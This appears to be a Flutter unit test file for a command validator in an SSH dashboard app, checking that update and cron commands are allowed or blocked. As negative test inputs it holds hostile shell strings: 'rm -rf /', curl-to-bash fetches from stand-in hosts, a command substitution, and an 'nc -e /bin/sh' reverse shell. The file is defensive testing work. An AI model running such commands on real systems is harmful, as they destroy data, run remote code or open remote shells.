import 'package:flutter_test/flutter_test.dart';
import 'package:ssh_dashboard/utils/command_validator.dart';

void main() {
  group('CommandValidator - validateUpdateCommand', () {
    test('standard update commands are safe', () {
      final res1 = CommandValidator.validateUpdateCommand('sudo apt update && sudo apt upgrade -y');
      expect(res1.isSafe, true);
      expect(res1.severity, ValidationSeverity.safe);

      final res2 = CommandValidator.validateUpdateCommand('Sudo apt update && sudo apt -y upgrade');
      expect(res2.isSafe, true);
      expect(res2.severity, ValidationSeverity.safe);

      final res3 = CommandValidator.validateUpdateCommand('sudo apt-get update && sudo apt-get -y upgrade');
      expect(res3.isSafe, true);
      expect(res3.severity, ValidationSeverity.safe);
    });

    test('pacman update is safe', () {
      final res = CommandValidator.validateUpdateCommand('sudo pacman -Syu');
      expect(res.isSafe, true);
      expect(res.severity, ValidationSeverity.safe);
    });

    test('non-whitelisted update commands are blocked by default', () {
      final res = CommandValidator.validateUpdateCommand('echo "updating" && custom_script.sh');
      expect(res.isSafe, false);
      expect(res.severity, ValidationSeverity.blocked);
    });

    test('destructive commands like rm -rf are blocked', () {
      final res1 = CommandValidator.validateUpdateCommand('rm -rf /');
      expect(res1.isSafe, false);
      expect(res1.severity, ValidationSeverity.blocked);

      final res2 = CommandValidator.validateUpdateCommand('apt update && rm -rf /var');
      expect(res2.isSafe, false);
      expect(res2.severity, ValidationSeverity.blocked);
    });

    test('subshells and command substitutions are blocked', () {
      final res1 = CommandValidator.validateUpdateCommand('echo `rm -rf /`');
      expect(res1.isSafe, false);
      expect(res1.severity, ValidationSeverity.blocked);

      final res2 = CommandValidator.validateUpdateCommand('apt update && \$(curl bad.com/sh)');
      expect(res2.isSafe, false);
      expect(res2.severity, ValidationSeverity.blocked);
    });

    test('curl to bash is blocked', () {
      final res = CommandValidator.validateUpdateCommand('curl http://malicious.com/payload.sh | sudo bash');
      expect(res.isSafe, false);
      expect(res.severity, ValidationSeverity.blocked);
    });
  });

  group('CommandValidator - validateCronJob', () {
    test('standard user cron job is safe', () {
      final res = CommandValidator.validateCronJob('0 4 * * *', '/home/user/backup.sh > /dev/null 2>&1', isRoot: false);
      expect(res.isSafe, true);
      expect(res.severity, ValidationSeverity.safe);
    });

    test('root cron job executing script inside /tmp is blocked', () {
      final res = CommandValidator.validateCronJob('0 2 * * *', '/tmp/malicious.sh', isRoot: true);
      expect(res.isSafe, false);
      expect(res.severity, ValidationSeverity.blocked);
    });

    test('root cron job with reverse shell or nc -e is blocked', () {
      final res = CommandValidator.validateCronJob('* * * * *', 'nc -e /bin/sh 10.0.0.1 4444', isRoot: true);
      expect(res.isSafe, false);
      expect(res.severity, ValidationSeverity.blocked);
    });

    test('root @reboot cron job with network request or pipes is blocked', () {
      final res = CommandValidator.validateCronJob('@reboot', 'curl http://bad.com/payload | bash', isRoot: true);
      expect(res.isSafe, false);
      expect(res.severity, ValidationSeverity.blocked);
    });

    test('root @reboot cron job with local safe script gives warning', () {
      final res = CommandValidator.validateCronJob('@reboot', '/root/startup.sh', isRoot: true);
      expect(res.isSafe, true);
      expect(res.severity, ValidationSeverity.warning);
    });
  });
}
